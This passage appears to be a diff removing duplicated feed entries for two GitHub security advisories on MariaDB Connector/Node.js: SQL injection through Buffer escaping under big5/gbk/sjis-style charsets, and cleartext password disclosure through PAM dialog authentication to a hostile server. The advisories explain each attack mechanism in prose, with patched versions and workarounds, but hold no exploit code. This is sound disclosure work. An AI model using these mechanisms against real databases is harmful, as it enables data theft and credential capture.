-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch:</p>
-<ul>
-<li>3.5.x → 3.5.3</li>
-<li>3.4.x → 3.4.6</li>
-<li>3.3.x → 3.3.3</li>
-<li>3.2.x and earlier → 3.2.4 (or any newer release)</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<p>Use server-side prepared statements (execute) so parameters are bound via the binary protocol rather than escaped into the SQL text.
-Avoid passing untrusted data as Buffer parameters under the affected charsets.</p>
-<p>Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-350">https://jira.mariadb.org/browse/CONJS-350</a></li>
-<li><a href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:53:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has  possible SQL injection in Buffer parameter escaping under big5/gbk/sjis/cp932/gb18030 client charsets]]></title>
-        <id>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</id>
-        <link href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm"/>
-        <updated>2026-08-28T22:53:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A SQL injection is possible when the connector escapes Buffer parameters client-side under a multi-byte client character set whose trail-byte range overlaps the ASCII backslash (0x5C): big5, gbk, sjis, cp932, and gb18030. Under these charsets, an attacker-controlled lead byte can absorb the escape byte the connector inserts, leaving the following quote unescaped so it terminates the string literal and injected SQL is parsed.</p>
-<h3 id="details">Details</h3>
-<p>When binding a Buffer (binary) parameter, the connector escapes the value byte-by-byte, inserting a backslash (0x5C) before quote (0x27) and backslash bytes. This is correct under single-byte and UTF-8–family charsets, but unsafe under client charsets whose multi-byte trail-byte range includes 0x5C.</p>
-<p>On the server, the SQL lexer performs multi-byte character recognition (my_ismbchar) before it interprets escape sequences. If character_set_client is one of the affected charsets and the attacker controls a byte the lexer treats as a valid lead byte, the sequence &lt;0x5C&gt; is consumed as a single multi-byte character. The escaping backslash inserted by the connector is swallowed as that character's trail byte, so the following 0x27 is no longer escaped — it closes the string literal, and the remaining bytes are parsed as SQL.</p>
-<p>This is the well-known multi-byte escaping bypass (the same class that historically affected addslashes / mysql_real_escape_string under GBK/Big5), here applied to the connector's client-side Buffer escaping path.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched releases listed below.
-The connection's client character set is one of big5, gbk, sjis, cp932, or gb18030. This is not the default (the default is utf8mb4).
-Untrusted data can reach a Buffer-typed query parameter.</p>
-<p>Applications using utf8mb4 (or any charset whose trail-byte range does not include 0x5C) are not affected by this vector. Parameters bound through the binary/server-side prepared-statement path are also not affected, because those values are sent out-of-band and are never escaped into the SQL text.</p>
-<h3 id="impact">Impact</h3>
-<p>SQL injection. An attacker able to influence the contents of a Buffer parameter can break out of the intended string literal and inject arbitrary SQL, leading to unauthorized read or modification of data and, depending on the database account's privileges, further compromise.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch:</p>
-<ul>
-<li>3.5.x → 3.5.3</li>
-<li>3.4.x → 3.4.6</li>
-<li>3.3.x → 3.3.3</li>
-<li>3.2.x and earlier → 3.2.4 (or any newer release)</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<p>Use server-side prepared statements (execute) so parameters are bound via the binary protocol rather than escaped into the SQL text.
-Avoid passing untrusted data as Buffer parameters under the affected charsets.</p>
-<p>Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-350">https://jira.mariadb.org/browse/CONJS-350</a></li>
-<li><a href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:53:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has  possible SQL injection in Buffer parameter escaping under big5/gbk/sjis/cp932/gb18030 client charsets]]></title>
-        <id>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</id>
-        <link href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm"/>
-        <updated>2026-08-28T22:53:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A SQL injection is possible when the connector escapes Buffer parameters client-side under a multi-byte client character set whose trail-byte range overlaps the ASCII backslash (0x5C): big5, gbk, sjis, cp932, and gb18030. Under these charsets, an attacker-controlled lead byte can absorb the escape byte the connector inserts, leaving the following quote unescaped so it terminates the string literal and injected SQL is parsed.</p>
-<h3 id="details">Details</h3>
-<p>When binding a Buffer (binary) parameter, the connector escapes the value byte-by-byte, inserting a backslash (0x5C) before quote (0x27) and backslash bytes. This is correct under single-byte and UTF-8–family charsets, but unsafe under client charsets whose multi-byte trail-byte range includes 0x5C.</p>
-<p>On the server, the SQL lexer performs multi-byte character recognition (my_ismbchar) before it interprets escape sequences. If character_set_client is one of the affected charsets and the attacker controls a byte the lexer treats as a valid lead byte, the sequence &lt;0x5C&gt; is consumed as a single multi-byte character. The escaping backslash inserted by the connector is swallowed as that character's trail byte, so the following 0x27 is no longer escaped — it closes the string literal, and the remaining bytes are parsed as SQL.</p>
-<p>This is the well-known multi-byte escaping bypass (the same class that historically affected addslashes / mysql_real_escape_string under GBK/Big5), here applied to the connector's client-side Buffer escaping path.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched releases listed below.
-The connection's client character set is one of big5, gbk, sjis, cp932, or gb18030. This is not the default (the default is utf8mb4).
-Untrusted data can reach a Buffer-typed query parameter.</p>
-<p>Applications using utf8mb4 (or any charset whose trail-byte range does not include 0x5C) are not affected by this vector. Parameters bound through the binary/server-side prepared-statement path are also not affected, because those values are sent out-of-band and are never escaped into the SQL text.</p>
-<h3 id="impact">Impact</h3>
-<p>SQL injection. An attacker able to influence the contents of a Buffer parameter can break out of the intended string literal and inject arbitrary SQL, leading to unauthorized read or modification of data and, depending on the database account's privileges, further compromise.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch:</p>
-<ul>
-<li>3.5.x → 3.5.3</li>
-<li>3.4.x → 3.4.6</li>
-<li>3.3.x → 3.3.3</li>
-<li>3.2.x and earlier → 3.2.4 (or any newer release)</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<p>Use server-side prepared statements (execute) so parameters are bound via the binary protocol rather than escaped into the SQL text.
-Avoid passing untrusted data as Buffer parameters under the affected charsets.</p>
-<p>Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-350">https://jira.mariadb.org/browse/CONJS-350</a></li>
-<li><a href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:53:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has  possible SQL injection in Buffer parameter escaping under big5/gbk/sjis/cp932/gb18030 client charsets]]></title>
-        <id>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</id>
-        <link href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm"/>
-        <updated>2026-08-28T22:53:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A SQL injection is possible when the connector escapes Buffer parameters client-side under a multi-byte client character set whose trail-byte range overlaps the ASCII backslash (0x5C): big5, gbk, sjis, cp932, and gb18030. Under these charsets, an attacker-controlled lead byte can absorb the escape byte the connector inserts, leaving the following quote unescaped so it terminates the string literal and injected SQL is parsed.</p>
-<h3 id="details">Details</h3>
-<p>When binding a Buffer (binary) parameter, the connector escapes the value byte-by-byte, inserting a backslash (0x5C) before quote (0x27) and backslash bytes. This is correct under single-byte and UTF-8–family charsets, but unsafe under client charsets whose multi-byte trail-byte range includes 0x5C.</p>
-<p>On the server, the SQL lexer performs multi-byte character recognition (my_ismbchar) before it interprets escape sequences. If character_set_client is one of the affected charsets and the attacker controls a byte the lexer treats as a valid lead byte, the sequence &lt;0x5C&gt; is consumed as a single multi-byte character. The escaping backslash inserted by the connector is swallowed as that character's trail byte, so the following 0x27 is no longer escaped — it closes the string literal, and the remaining bytes are parsed as SQL.</p>
-<p>This is the well-known multi-byte escaping bypass (the same class that historically affected addslashes / mysql_real_escape_string under GBK/Big5), here applied to the connector's client-side Buffer escaping path.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched releases listed below.
-The connection's client character set is one of big5, gbk, sjis, cp932, or gb18030. This is not the default (the default is utf8mb4).
-Untrusted data can reach a Buffer-typed query parameter.</p>
-<p>Applications using utf8mb4 (or any charset whose trail-byte range does not include 0x5C) are not affected by this vector. Parameters bound through the binary/server-side prepared-statement path are also not affected, because those values are sent out-of-band and are never escaped into the SQL text.</p>
-<h3 id="impact">Impact</h3>
-<p>SQL injection. An attacker able to influence the contents of a Buffer parameter can break out of the intended string literal and inject arbitrary SQL, leading to unauthorized read or modification of data and, depending on the database account's privileges, further compromise.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch:</p>
-<ul>
-<li>3.5.x → 3.5.3</li>
-<li>3.4.x → 3.4.6</li>
-<li>3.3.x → 3.3.3</li>
-<li>3.2.x and earlier → 3.2.4 (or any newer release)</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<p>Use server-side prepared statements (execute) so parameters are bound via the binary protocol rather than escaped into the SQL text.
-Avoid passing untrusted data as Buffer parameters under the affected charsets.</p>
-<p>Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/0148cadba48064d430902678bbc5b4b62dc1c04f</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-350">https://jira.mariadb.org/browse/CONJS-350</a></li>
-<li><a href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm">https://github.com/advisories/GHSA-g5xc-5w98-jfvm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:53:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has Cleartext Transmission of Sensitive Information and Insufficiently Protected Credentials]]></title>
-        <id>https://github.com/advisories/GHSA-42r5-vhpq-m858</id>
-        <link href="https://github.com/advisories/GHSA-42r5-vhpq-m858"/>
-        <updated>2026-08-28T22:04:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When PAM (dialog) authentication is used, the connector can be coerced into sending the account password in cleartext over an insecure connection. A hostile or man-in-the-middle server can trigger this with the default configuration, disclosing the user's password.</p>
-<h3 id="details">Details</h3>
-<p>The mysql_clear_password plugin is gated behind a secure connection: the driver refuses to transmit the password in cleartext over plain TCP. The sibling PAM plugin handler (SendPamAuthPacketFactory, server-side plugin name dialog) did not override that gate and inherited the default value false, so it was not subject to the same secure-transport requirement.</p>
-<p>As a result, a hostile or man-in-the-middle server can issue an Authentication Switch Request for the dialog plugin over plain TCP, and the driver responds with the user's password in cleartext. With the default configuration (sslMode=DISABLE, restrictedAuth=null) this is reachable with no non-default options.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched release(s).
-Connections can occur over an insecure transport: plain TCP (sslMode=DISABLE), or a TLS mode that establishes server identity only via self-signed-certificate fingerprint validation.
-An attacker can occupy an on-path (MITM) position, or otherwise cause the client to connect to a server they control, and present an Authentication Switch Request for the dialog plugin.</p>
-<p>Connections over properly verified TLS or a local Unix socket are not exposed to this vector.</p>
-<h3 id="impact">Impact</h3>
-<p>Disclosure of the authenticating account's password in cleartext to an on-path or hostile server. The captured credentials can then be reused to authenticate to the database (and, if reused elsewhere, beyond it).</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch (3.5.x → 3.5.3, 3.4.x → 3.4.6, 3.3.x → 3.3.3, 3.2.x and earlier → 3.2.4). PAM (dialog) is now treated exactly like mysql_clear_password: it may only run over a secure transport. SendPamAuthPacketFactory overrides the secure-required flag to true, and the authentication dispatcher permits a secure-required plugin only when the connection is TLS or a local Unix socket. The pre-existing check that blocks non-MITM-proof plugins when server identity relies solely on self-signed-certificate fingerprint validation continues to apply. Net effect: PAM is allowed over TLS or a Unix socket, and rejected over plain TCP or fingerprint-only connections.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<ul>
-<li>Restrict the permitted authentication plugins via restrictedAuth so dialog cannot be negotiated over an insecure transport.
-Avoid PAM (dialog) authentication over plain TCP.</li>
-</ul>
-<p>###Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-353">https://jira.mariadb.org/browse/CONJS-353</a></li>
-<li><a href="https://github.com/advisories/GHSA-42r5-vhpq-m858">https://github.com/advisories/GHSA-42r5-vhpq-m858</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-42r5-vhpq-m858</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:04:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has Cleartext Transmission of Sensitive Information and Insufficiently Protected Credentials]]></title>
-        <id>https://github.com/advisories/GHSA-42r5-vhpq-m858</id>
-        <link href="https://github.com/advisories/GHSA-42r5-vhpq-m858"/>
-        <updated>2026-08-28T22:04:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When PAM (dialog) authentication is used, the connector can be coerced into sending the account password in cleartext over an insecure connection. A hostile or man-in-the-middle server can trigger this with the default configuration, disclosing the user's password.</p>
-<h3 id="details">Details</h3>
-<p>The mysql_clear_password plugin is gated behind a secure connection: the driver refuses to transmit the password in cleartext over plain TCP. The sibling PAM plugin handler (SendPamAuthPacketFactory, server-side plugin name dialog) did not override that gate and inherited the default value false, so it was not subject to the same secure-transport requirement.</p>
-<p>As a result, a hostile or man-in-the-middle server can issue an Authentication Switch Request for the dialog plugin over plain TCP, and the driver responds with the user's password in cleartext. With the default configuration (sslMode=DISABLE, restrictedAuth=null) this is reachable with no non-default options.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched release(s).
-Connections can occur over an insecure transport: plain TCP (sslMode=DISABLE), or a TLS mode that establishes server identity only via self-signed-certificate fingerprint validation.
-An attacker can occupy an on-path (MITM) position, or otherwise cause the client to connect to a server they control, and present an Authentication Switch Request for the dialog plugin.</p>
-<p>Connections over properly verified TLS or a local Unix socket are not exposed to this vector.</p>
-<h3 id="impact">Impact</h3>
-<p>Disclosure of the authenticating account's password in cleartext to an on-path or hostile server. The captured credentials can then be reused to authenticate to the database (and, if reused elsewhere, beyond it).</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch (3.5.x → 3.5.3, 3.4.x → 3.4.6, 3.3.x → 3.3.3, 3.2.x and earlier → 3.2.4). PAM (dialog) is now treated exactly like mysql_clear_password: it may only run over a secure transport. SendPamAuthPacketFactory overrides the secure-required flag to true, and the authentication dispatcher permits a secure-required plugin only when the connection is TLS or a local Unix socket. The pre-existing check that blocks non-MITM-proof plugins when server identity relies solely on self-signed-certificate fingerprint validation continues to apply. Net effect: PAM is allowed over TLS or a Unix socket, and rejected over plain TCP or fingerprint-only connections.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<ul>
-<li>Restrict the permitted authentication plugins via restrictedAuth so dialog cannot be negotiated over an insecure transport.
-Avoid PAM (dialog) authentication over plain TCP.</li>
-</ul>
-<p>###Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-353">https://jira.mariadb.org/browse/CONJS-353</a></li>
-<li><a href="https://github.com/advisories/GHSA-42r5-vhpq-m858">https://github.com/advisories/GHSA-42r5-vhpq-m858</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-42r5-vhpq-m858</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:04:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has Cleartext Transmission of Sensitive Information and Insufficiently Protected Credentials]]></title>
-        <id>https://github.com/advisories/GHSA-42r5-vhpq-m858</id>
-        <link href="https://github.com/advisories/GHSA-42r5-vhpq-m858"/>
-        <updated>2026-08-28T22:04:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When PAM (dialog) authentication is used, the connector can be coerced into sending the account password in cleartext over an insecure connection. A hostile or man-in-the-middle server can trigger this with the default configuration, disclosing the user's password.</p>
-<h3 id="details">Details</h3>
-<p>The mysql_clear_password plugin is gated behind a secure connection: the driver refuses to transmit the password in cleartext over plain TCP. The sibling PAM plugin handler (SendPamAuthPacketFactory, server-side plugin name dialog) did not override that gate and inherited the default value false, so it was not subject to the same secure-transport requirement.</p>
-<p>As a result, a hostile or man-in-the-middle server can issue an Authentication Switch Request for the dialog plugin over plain TCP, and the driver responds with the user's password in cleartext. With the default configuration (sslMode=DISABLE, restrictedAuth=null) this is reachable with no non-default options.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched release(s).
-Connections can occur over an insecure transport: plain TCP (sslMode=DISABLE), or a TLS mode that establishes server identity only via self-signed-certificate fingerprint validation.
-An attacker can occupy an on-path (MITM) position, or otherwise cause the client to connect to a server they control, and present an Authentication Switch Request for the dialog plugin.</p>
-<p>Connections over properly verified TLS or a local Unix socket are not exposed to this vector.</p>
-<h3 id="impact">Impact</h3>
-<p>Disclosure of the authenticating account's password in cleartext to an on-path or hostile server. The captured credentials can then be reused to authenticate to the database (and, if reused elsewhere, beyond it).</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch (3.5.x → 3.5.3, 3.4.x → 3.4.6, 3.3.x → 3.3.3, 3.2.x and earlier → 3.2.4). PAM (dialog) is now treated exactly like mysql_clear_password: it may only run over a secure transport. SendPamAuthPacketFactory overrides the secure-required flag to true, and the authentication dispatcher permits a secure-required plugin only when the connection is TLS or a local Unix socket. The pre-existing check that blocks non-MITM-proof plugins when server identity relies solely on self-signed-certificate fingerprint validation continues to apply. Net effect: PAM is allowed over TLS or a Unix socket, and rejected over plain TCP or fingerprint-only connections.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<ul>
-<li>Restrict the permitted authentication plugins via restrictedAuth so dialog cannot be negotiated over an insecure transport.
-Avoid PAM (dialog) authentication over plain TCP.</li>
-</ul>
-<p>###Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-353">https://jira.mariadb.org/browse/CONJS-353</a></li>
-<li><a href="https://github.com/advisories/GHSA-42r5-vhpq-m858">https://github.com/advisories/GHSA-42r5-vhpq-m858</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-42r5-vhpq-m858</uri>
-        </author>
